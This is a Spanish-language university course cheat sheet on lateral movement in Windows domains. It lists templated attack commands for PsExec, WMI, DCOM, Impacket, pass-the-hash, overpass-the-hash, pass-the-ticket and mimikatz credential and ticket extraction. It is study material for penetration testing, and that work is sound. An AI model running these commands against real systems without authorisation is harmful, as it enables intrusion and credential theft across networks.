# 7. Movimiento lateral
## D1n0 - Alejandro Maman INSO3A U-TAD - 2025/2026

### Protocolos para movimiento lateral
- **SMB** (Server Message Block)
- **WinRM** (Windows Remote Management)
- **DCOM** (Distributed Component Object Model)
- **WMI** (Windows Management Instrumentation)
- **RDP** (Remote Desktop Protocol)

### Acceso con credenciales Windows → Windows
```cmd
# PsExec
PsExec.exe \\<hostname> -u <usuario> -p <clave> cmd

# PowerShell remoto
Enter-PSSession -ComputerName <hostname> -Credential (Get-Credential)

# WMI nativo (sin output)
wmic /node:<hostname> /user:<usuario> /password:<clave> process call create "cmd.exe /c <comando>"

# DCOM
Invoke-DCOM -ComputerName '<ip>' -Method MMC20.Application -Command "<comando>"
```

### Acceso con credenciales Linux → Windows (Impacket)
```bash
# SMB interactivo
impacket-psexec <dominio>/<usuario>:<password>@<IP>

# WMI (no interactivo)
impacket-wmiexec <dominio>/<usuario>:<password>@<IP>

# RDP con recurso compartido
rdesktop -d <dominio> -u <usuario> -p <password> <IP> -r disk:share=/root/myshare
```

### Pass-the-Hash (PTH)
Usa el hash NTLM directamente para autenticarse (challenge-response).
```bash
# RDP (sin NLA)
xfreerdp /u:<user> /d:<dominio> /pth:<hash> /v:<ip>

# Consola SMB
impacket-smbexec <dominio>/<usuario>@<ip> -hashes <LM:NTLM>
```

### Overpass-the-Hash
Usa el hash NTLM para solicitar un TGT de Kerberos (entornos con Kerberos).
```cmd
sekurlsa::pth /user:<usuario> /domain:<FQDN dominio> /ntlm:<hash NTLM>
```
```bash
impacket-psexec <FQDN dominio>/<usuario>:<pass>@<FQDN objetivo> -k -dc-ip <IP DC> -target-ip <IP objetivo>
```

### Funcionamiento de Kerberos
- **KDC** (Key Distribution Center): en AD suele ser el DC
- **TGT** (Ticket Granting Ticket): para autenticarse contra Kerberos
- **TGS / ST** (Service Ticket): para autenticarse en un servicio específico

### Pass-the-Ticket (PTT)
Obtener un ticket TGT de un usuario y usarlo para acceder a recursos.
```cmd
# Exportar tickets
mimikatz # sekurlsa::tickets /export

# Listar tickets con krbtgt
dir | findstr "Administrator" | findstr "krbtgt"

# Cargar ticket
mimikatz # kerberos::ptt <archivo ticket>
```

### Pass-the-Hash con hashes de máquinas
```cmd
# Windows
mimikatz# sekurlsa::pth /user:<nombre máquina>$ /domain:<FQDN> /ntlm:<NTLM>
```
```bash
# Linux
impacket-secretsdump <Nombre maq.>/$@<IP> -hashes :<NTLM>
```

---
